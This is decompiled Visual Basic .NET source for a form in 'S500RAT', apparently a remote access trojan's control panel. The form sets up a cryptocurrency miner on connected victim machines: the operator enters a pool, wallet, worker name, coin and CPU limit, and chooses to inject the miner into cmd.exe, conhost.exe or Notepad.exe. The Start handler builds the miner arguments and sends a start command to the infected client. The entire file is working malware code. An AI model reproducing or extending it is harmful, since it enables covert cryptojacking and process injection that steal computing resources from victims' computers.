Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x0200003B RID: 59
	<DesignerGenerated()>
	Public Partial Class FormXMR
		Inherits Form

		' Token: 0x06001064 RID: 4196 RVA: 0x0008D683 File Offset: 0x0008B883
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormXMR_Load
			AddHandler MyBase.Resize, AddressOf Me.FormXMR_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x170006B0 RID: 1712
		' (get) Token: 0x06001067 RID: 4199 RVA: 0x0008FD86 File Offset: 0x0008DF86
		' (set) Token: 0x06001068 RID: 4200 RVA: 0x0008FD90 File Offset: 0x0008DF90
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x170006B1 RID: 1713
		' (get) Token: 0x06001069 RID: 4201 RVA: 0x0008FD99 File Offset: 0x0008DF99
		' (set) Token: 0x0600106A RID: 4202 RVA: 0x0008FDA4 File Offset: 0x0008DFA4
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170006B2 RID: 1714
		' (get) Token: 0x0600106B RID: 4203 RVA: 0x0008FDE7 File Offset: 0x0008DFE7
		' (set) Token: 0x0600106C RID: 4204 RVA: 0x0008FDF1 File Offset: 0x0008DFF1
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x170006B3 RID: 1715
		' (get) Token: 0x0600106D RID: 4205 RVA: 0x0008FDFA File Offset: 0x0008DFFA
		' (set) Token: 0x0600106E RID: 4206 RVA: 0x0008FE04 File Offset: 0x0008E004
		Private Overridable Property ClientInfo As Label

		' Token: 0x170006B4 RID: 1716
		' (get) Token: 0x0600106F RID: 4207 RVA: 0x0008FE0D File Offset: 0x0008E00D
		' (set) Token: 0x06001070 RID: 4208 RVA: 0x0008FE17 File Offset: 0x0008E017
		Friend Overridable Property GroupConfig As Guna2GroupBox

		' Token: 0x170006B5 RID: 1717
		' (get) Token: 0x06001071 RID: 4209 RVA: 0x0008FE20 File Offset: 0x0008E020
		' (set) Token: 0x06001072 RID: 4210 RVA: 0x0008FE2A File Offset: 0x0008E02A
		Friend Overridable Property Label1 As Label

		' Token: 0x170006B6 RID: 1718
		' (get) Token: 0x06001073 RID: 4211 RVA: 0x0008FE33 File Offset: 0x0008E033
		' (set) Token: 0x06001074 RID: 4212 RVA: 0x0008FE3D File Offset: 0x0008E03D
		Friend Overridable Property InjectNotepad As UIRadioButton

		' Token: 0x170006B7 RID: 1719
		' (get) Token: 0x06001075 RID: 4213 RVA: 0x0008FE46 File Offset: 0x0008E046
		' (set) Token: 0x06001076 RID: 4214 RVA: 0x0008FE50 File Offset: 0x0008E050
		Friend Overridable Property PictureBox36 As PictureBox

		' Token: 0x170006B8 RID: 1720
		' (get) Token: 0x06001077 RID: 4215 RVA: 0x0008FE59 File Offset: 0x0008E059
		' (set) Token: 0x06001078 RID: 4216 RVA: 0x0008FE63 File Offset: 0x0008E063
		Friend Overridable Property InjectConhost As UIRadioButton

		' Token: 0x170006B9 RID: 1721
		' (get) Token: 0x06001079 RID: 4217 RVA: 0x0008FE6C File Offset: 0x0008E06C
		' (set) Token: 0x0600107A RID: 4218 RVA: 0x0008FE76 File Offset: 0x0008E076
		Friend Overridable Property InjectCmd As UIRadioButton

		' Token: 0x170006BA RID: 1722
		' (get) Token: 0x0600107B RID: 4219 RVA: 0x0008FE7F File Offset: 0x0008E07F
		' (set) Token: 0x0600107C RID: 4220 RVA: 0x0008FE89 File Offset: 0x0008E089
		Friend Overridable Property PictureBox39 As PictureBox

		' Token: 0x170006BB RID: 1723
		' (get) Token: 0x0600107D RID: 4221 RVA: 0x0008FE92 File Offset: 0x0008E092
		' (set) Token: 0x0600107E RID: 4222 RVA: 0x0008FE9C File Offset: 0x0008E09C
		Friend Overridable Property MiningWorkName As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._MiningWorkName
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As EventHandler = AddressOf Me.MiningWorkName_TextChanged
				Dim value3 As KeyPressEventHandler = AddressOf Me.MiningWorkName_KeyPress
				Dim miningWorkName As Guna2TextBox = Me._MiningWorkName
				If miningWorkName IsNot Nothing Then
					RemoveHandler miningWorkName.TextChanged, value2
					RemoveHandler miningWorkName.KeyPress, value3
				End If
				Me._MiningWorkName = value
				miningWorkName = Me._MiningWorkName
				If miningWorkName IsNot Nothing Then
					AddHandler miningWorkName.TextChanged, value2
					AddHandler miningWorkName.KeyPress, value3
				End If
			End Set
		End Property

		' Token: 0x170006BC RID: 1724
		' (get) Token: 0x0600107F RID: 4223 RVA: 0x0008FEFA File Offset: 0x0008E0FA
		' (set) Token: 0x06001080 RID: 4224 RVA: 0x0008FF04 File Offset: 0x0008E104
		Friend Overridable Property MiningPool As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._MiningPool
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As EventHandler = AddressOf Me.MiningPool_TextChanged
				Dim value3 As KeyPressEventHandler = AddressOf Me.MiningPool_KeyPress
				Dim miningPool As Guna2TextBox = Me._MiningPool
				If miningPool IsNot Nothing Then
					RemoveHandler miningPool.TextChanged, value2
					RemoveHandler miningPool.KeyPress, value3
				End If
				Me._MiningPool = value
				miningPool = Me._MiningPool
				If miningPool IsNot Nothing Then
					AddHandler miningPool.TextChanged, value2
					AddHandler miningPool.KeyPress, value3
				End If
			End Set
		End Property

		' Token: 0x170006BD RID: 1725
		' (get) Token: 0x06001081 RID: 4225 RVA: 0x0008FF62 File Offset: 0x0008E162
		' (set) Token: 0x06001082 RID: 4226 RVA: 0x0008FF6C File Offset: 0x0008E16C
		Friend Overridable Property MiningWalletAddress As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._MiningWalletAddress
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As EventHandler = AddressOf Me.MiningWalletAddress_TextChanged
				Dim value3 As KeyPressEventHandler = AddressOf Me.MiningWalletAddress_KeyPress
				Dim miningWalletAddress As Guna2TextBox = Me._MiningWalletAddress
				If miningWalletAddress IsNot Nothing Then
					RemoveHandler miningWalletAddress.TextChanged, value2
					RemoveHandler miningWalletAddress.KeyPress, value3
				End If
				Me._MiningWalletAddress = value
				miningWalletAddress = Me._MiningWalletAddress
				If miningWalletAddress IsNot Nothing Then
					AddHandler miningWalletAddress.TextChanged, value2
					AddHandler miningWalletAddress.KeyPress, value3
				End If
			End Set
		End Property

		' Token: 0x170006BE RID: 1726
		' (get) Token: 0x06001083 RID: 4227 RVA: 0x0008FFCA File Offset: 0x0008E1CA
		' (set) Token: 0x06001084 RID: 4228 RVA: 0x0008FFD4 File Offset: 0x0008E1D4
		Friend Overridable Property GroupCoin As Guna2GroupBox

		' Token: 0x170006BF RID: 1727
		' (get) Token: 0x06001085 RID: 4229 RVA: 0x0008FFDD File Offset: 0x0008E1DD
		' (set) Token: 0x06001086 RID: 4230 RVA: 0x0008FFE7 File Offset: 0x0008E1E7
		Friend Overridable Property PictureBox41 As PictureBox

		' Token: 0x170006C0 RID: 1728
		' (get) Token: 0x06001087 RID: 4231 RVA: 0x0008FFF0 File Offset: 0x0008E1F0
		' (set) Token: 0x06001088 RID: 4232 RVA: 0x0008FFFA File Offset: 0x0008E1FA
		Friend Overridable Property ConDOGE As UIRadioButton

		' Token: 0x170006C1 RID: 1729
		' (get) Token: 0x06001089 RID: 4233 RVA: 0x00090003 File Offset: 0x0008E203
		' (set) Token: 0x0600108A RID: 4234 RVA: 0x0009000D File Offset: 0x0008E20D
		Friend Overridable Property PictureBox35 As PictureBox

		' Token: 0x170006C2 RID: 1730
		' (get) Token: 0x0600108B RID: 4235 RVA: 0x00090016 File Offset: 0x0008E216
		' (set) Token: 0x0600108C RID: 4236 RVA: 0x00090020 File Offset: 0x0008E220
		Friend Overridable Property ConLSK As UIRadioButton

		' Token: 0x170006C3 RID: 1731
		' (get) Token: 0x0600108D RID: 4237 RVA: 0x00090029 File Offset: 0x0008E229
		' (set) Token: 0x0600108E RID: 4238 RVA: 0x00090033 File Offset: 0x0008E233
		Friend Overridable Property PictureBox40 As PictureBox

		' Token: 0x170006C4 RID: 1732
		' (get) Token: 0x0600108F RID: 4239 RVA: 0x0009003C File Offset: 0x0008E23C
		' (set) Token: 0x06001090 RID: 4240 RVA: 0x00090046 File Offset: 0x0008E246
		Friend Overridable Property ConETH As UIRadioButton

		' Token: 0x170006C5 RID: 1733
		' (get) Token: 0x06001091 RID: 4241 RVA: 0x0009004F File Offset: 0x0008E24F
		' (set) Token: 0x06001092 RID: 4242 RVA: 0x00090059 File Offset: 0x0008E259
		Friend Overridable Property PictureBox34 As PictureBox

		' Token: 0x170006C6 RID: 1734
		' (get) Token: 0x06001093 RID: 4243 RVA: 0x00090062 File Offset: 0x0008E262
		' (set) Token: 0x06001094 RID: 4244 RVA: 0x0009006C File Offset: 0x0008E26C
		Friend Overridable Property PictureBox11 As PictureBox

		' Token: 0x170006C7 RID: 1735
		' (get) Token: 0x06001095 RID: 4245 RVA: 0x00090075 File Offset: 0x0008E275
		' (set) Token: 0x06001096 RID: 4246 RVA: 0x0009007F File Offset: 0x0008E27F
		Friend Overridable Property ConXMR As UIRadioButton

		' Token: 0x170006C8 RID: 1736
		' (get) Token: 0x06001097 RID: 4247 RVA: 0x00090088 File Offset: 0x0008E288
		' (set) Token: 0x06001098 RID: 4248 RVA: 0x00090092 File Offset: 0x0008E292
		Friend Overridable Property ConBTC As UIRadioButton

		' Token: 0x170006C9 RID: 1737
		' (get) Token: 0x06001099 RID: 4249 RVA: 0x0009009B File Offset: 0x0008E29B
		' (set) Token: 0x0600109A RID: 4250 RVA: 0x000900A5 File Offset: 0x0008E2A5
		Friend Overridable Property Label8 As Label

		' Token: 0x170006CA RID: 1738
		' (get) Token: 0x0600109B RID: 4251 RVA: 0x000900AE File Offset: 0x0008E2AE
		' (set) Token: 0x0600109C RID: 4252 RVA: 0x000900B8 File Offset: 0x0008E2B8
		Friend Overridable Property PictureBox37 As PictureBox

		' Token: 0x170006CB RID: 1739
		' (get) Token: 0x0600109D RID: 4253 RVA: 0x000900C1 File Offset: 0x0008E2C1
		' (set) Token: 0x0600109E RID: 4254 RVA: 0x000900CB File Offset: 0x0008E2CB
		Friend Overridable Property PanelCPUmax As Guna2GroupBox

		' Token: 0x170006CC RID: 1740
		' (get) Token: 0x0600109F RID: 4255 RVA: 0x000900D4 File Offset: 0x0008E2D4
		' (set) Token: 0x060010A0 RID: 4256 RVA: 0x000900DE File Offset: 0x0008E2DE
		Friend Overridable Property Label13 As Label

		' Token: 0x170006CD RID: 1741
		' (get) Token: 0x060010A1 RID: 4257 RVA: 0x000900E7 File Offset: 0x0008E2E7
		' (set) Token: 0x060010A2 RID: 4258 RVA: 0x000900F1 File Offset: 0x0008E2F1
		Friend Overridable Property PictureBox38 As PictureBox

		' Token: 0x170006CE RID: 1742
		' (get) Token: 0x060010A3 RID: 4259 RVA: 0x000900FA File Offset: 0x0008E2FA
		' (set) Token: 0x060010A4 RID: 4260 RVA: 0x00090104 File Offset: 0x0008E304
		Friend Overridable Property MiningNumMax As Guna2HtmlLabel

		' Token: 0x170006CF RID: 1743
		' (get) Token: 0x060010A5 RID: 4261 RVA: 0x0009010D File Offset: 0x0008E30D
		' (set) Token: 0x060010A6 RID: 4262 RVA: 0x00090118 File Offset: 0x0008E318
		Friend Overridable Property MiningMAX As Guna2TrackBar
			<CompilerGenerated()>
			Get
				Return Me._MiningMAX
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TrackBar)
				Dim value2 As ScrollEventHandler = AddressOf Me.MiningMAX_Scroll
				Dim miningMAX As Guna2TrackBar = Me._MiningMAX
				If miningMAX IsNot Nothing Then
					RemoveHandler miningMAX.Scroll, value2
				End If
				Me._MiningMAX = value
				miningMAX = Me._MiningMAX
				If miningMAX IsNot Nothing Then
					AddHandler miningMAX.Scroll, value2
				End If
			End Set
		End Property

		' Token: 0x170006D0 RID: 1744
		' (get) Token: 0x060010A7 RID: 4263 RVA: 0x0009015B File Offset: 0x0008E35B
		' (set) Token: 0x060010A8 RID: 4264 RVA: 0x00090168 File Offset: 0x0008E368
		Friend Overridable Property Power As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Power
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Power_Click
				Dim power As Guna2GradientButton = Me._Power
				If power IsNot Nothing Then
					RemoveHandler power.Click, value2
				End If
				Me._Power = value
				power = Me._Power
				If power IsNot Nothing Then
					AddHandler power.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170006D1 RID: 1745
		' (get) Token: 0x060010A9 RID: 4265 RVA: 0x000901AB File Offset: 0x0008E3AB
		' (set) Token: 0x060010AA RID: 4266 RVA: 0x000901B5 File Offset: 0x0008E3B5
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x170006D2 RID: 1746
		' (get) Token: 0x060010AB RID: 4267 RVA: 0x000901BE File Offset: 0x0008E3BE
		' (set) Token: 0x060010AC RID: 4268 RVA: 0x000901C8 File Offset: 0x0008E3C8
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170006D3 RID: 1747
		' (get) Token: 0x060010AD RID: 4269 RVA: 0x0009020B File Offset: 0x0008E40B
		' (set) Token: 0x060010AE RID: 4270 RVA: 0x00090215 File Offset: 0x0008E415
		Public Property Client As Clients

		' Token: 0x170006D4 RID: 1748
		' (get) Token: 0x060010AF RID: 4271 RVA: 0x0009021E File Offset: 0x0008E41E
		' (set) Token: 0x060010B0 RID: 4272 RVA: 0x00090228 File Offset: 0x0008E428
		Public Property F As FormS500

		' Token: 0x170006D5 RID: 1749
		' (get) Token: 0x060010B1 RID: 4273 RVA: 0x00090231 File Offset: 0x0008E431
		' (set) Token: 0x060010B2 RID: 4274 RVA: 0x0009023B File Offset: 0x0008E43B
		Public Property FullPath As String

		' Token: 0x170006D6 RID: 1750
		' (get) Token: 0x060010B3 RID: 4275 RVA: 0x00090244 File Offset: 0x0008E444
		' (set) Token: 0x060010B4 RID: 4276 RVA: 0x0009024E File Offset: 0x0008E44E
		Friend Property ParentClient As Clients

		' Token: 0x060010B5 RID: 4277 RVA: 0x00090257 File Offset: 0x0008E457
		Private Sub FormXMR_Load(sender As Object, e As EventArgs)
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
			Me.MaximumSize = MyBase.Size
		End Sub

		' Token: 0x060010B6 RID: 4278 RVA: 0x0009027C File Offset: 0x0008E47C
		Private Sub FormXMR_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x060010B7 RID: 4279 RVA: 0x00090310 File Offset: 0x0008E510
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x060010B8 RID: 4280 RVA: 0x0009037C File Offset: 0x0008E57C
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x060010B9 RID: 4281 RVA: 0x00090391 File Offset: 0x0008E591
		Private Sub MiningWorkName_TextChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060010BA RID: 4282 RVA: 0x00090394 File Offset: 0x0008E594
		Private Sub MiningWorkName_KeyPress(sender As Object, e As KeyPressEventArgs)
			e.Handled = ((e.KeyChar = "\"c OrElse Functions.CheckPathChard(e.KeyChar.ToString())) AndAlso Not Char.IsControl(e.KeyChar))
		End Sub

		' Token: 0x060010BB RID: 4283 RVA: 0x000903D9 File Offset: 0x0008E5D9
		Private Sub MiningWalletAddress_TextChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060010BC RID: 4284 RVA: 0x000903DC File Offset: 0x0008E5DC
		Private Sub MiningWalletAddress_KeyPress(sender As Object, e As KeyPressEventArgs)
			e.Handled = ((e.KeyChar = "\"c OrElse Functions.CheckPathChard(e.KeyChar.ToString())) AndAlso Not Char.IsControl(e.KeyChar))
		End Sub

		' Token: 0x060010BD RID: 4285 RVA: 0x00090421 File Offset: 0x0008E621
		Private Sub MiningPool_TextChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060010BE RID: 4286 RVA: 0x00090424 File Offset: 0x0008E624
		Private Sub MiningPool_KeyPress(sender As Object, e As KeyPressEventArgs)
			e.Handled = ((e.KeyChar = "\"c OrElse Functions.CheckPathChard(e.KeyChar.ToString())) AndAlso Not Char.IsControl(e.KeyChar))
		End Sub

		' Token: 0x060010BF RID: 4287 RVA: 0x0009046C File Offset: 0x0008E66C
		Private Sub MiningMAX_Scroll(sender As Object, e As ScrollEventArgs)
			Try
				Dim flag As Boolean = Me.MiningMAX.Value < 11
				If flag Then
					Me.MiningNumMax.Text = Conversions.ToString(10) + "%"
				Else
					Me.MiningNumMax.Text = Conversions.ToString(Me.MiningMAX.Value) + "%"
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060010C0 RID: 4288 RVA: 0x000904F8 File Offset: 0x0008E6F8
		Public Function getCoin() As Object
			Dim checked As Boolean = Me.ConBTC.Checked
			Dim result As Object
			If checked Then
				result = "BTC"
			Else
				Dim checked2 As Boolean = Me.ConETH.Checked
				If checked2 Then
					result = "ETH"
				Else
					Dim checked3 As Boolean = Me.ConLSK.Checked
					If checked3 Then
						result = "LSK"
					Else
						Dim checked4 As Boolean = Me.ConXMR.Checked
						If checked4 Then
							result = "XMR"
						Else
							Dim checked5 As Boolean = Me.ConDOGE.Checked
							If checked5 Then
								result = "DOGE"
							Else
								result = "BTC"
							End If
						End If
					End If
				End If
			End If
			Return result
		End Function

		' Token: 0x060010C1 RID: 4289 RVA: 0x00090588 File Offset: 0x0008E788
		Public Function MiningInject() As Object
			Dim checked As Boolean = Me.InjectCmd.Checked
			Dim result As Object
			If checked Then
				result = "C:\Windows\System32\cmd.exe"
			Else
				Dim checked2 As Boolean = Me.InjectConhost.Checked
				If checked2 Then
					result = "C:\Windows\System32\conhost.exe"
				Else
					Dim checked3 As Boolean = Me.InjectNotepad.Checked
					If checked3 Then
						result = "C:\Windows\System32\Notepad.exe"
					Else
						result = "C:\Windows\System32\cmd.exe"
					End If
				End If
			End If
			Return result
		End Function

		' Token: 0x060010C2 RID: 4290 RVA: 0x000905E8 File Offset: 0x0008E7E8
		Private Sub Power_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Power.Text, "Start", False) = 0
			If flag Then
				Dim flag2 As Boolean = Operators.CompareString(Me.MiningWalletAddress.Text, Nothing, False) = 0
				If flag2 Then
					MessageBox.Show(Me, "Enter your wallet address", "Builder!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
				Else
					Dim flag3 As Boolean = Operators.CompareString(Me.MiningPool.Text, Nothing, False) = 0
					If flag3 Then
						MessageBox.Show(Me, "Enter your pool", "Builder!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
					Else
						Dim flag4 As Boolean = Operators.CompareString(Me.MiningWorkName.Text, Nothing, False) = 0
						If flag4 Then
							MessageBox.Show(Me, "Enter your work name", "Builder!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
						Else
							Me.Power.Enabled = False
							Dim asString As String = " -B -o %Pool% -a rx -k -u %Coin%:%Wallet%.%WorkName% - p x--cpu - max - threads - hint = %MAX%--donate - level = 1".Replace("%Pool%", Me.MiningPool.Text).Replace("%Coin%", Conversions.ToString(Me.getCoin())).Replace("%Wallet%", Me.MiningWalletAddress.Text).ToString().Replace("%WorkName%", Me.MiningWorkName.Text).Replace("%MAX%", Conversions.ToString(Me.MiningMAX.Value))
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "Start"
							msgPack.ForcePathObject("Data").AsString = asString
							msgPack.ForcePathObject("Pool").AsString = Me.MiningPool.Text
							msgPack.ForcePathObject("Coin").AsString = Conversions.ToString(Me.getCoin())
							msgPack.ForcePathObject("Wallet").AsString = Me.MiningWalletAddress.Text
							msgPack.ForcePathObject("WorkName").AsString = Me.MiningWorkName.Text
							msgPack.ForcePathObject("CPUMax").AsString = Conversions.ToString(Me.MiningMAX.Value)
							msgPack.ForcePathObject("Inject").AsString = Conversions.ToString(Me.MiningInject())
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						End If
					End If
				End If
			Else
				Me.Power.Enabled = False
				Dim msgPack2 As MsgPack = New MsgPack()
				msgPack2.ForcePathObject("Packet").AsString = "Stop"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
			End If
		End Sub

		' Token: 0x04000780 RID: 1920
		Private FormSize As Boolean
	End Class
End Namespace
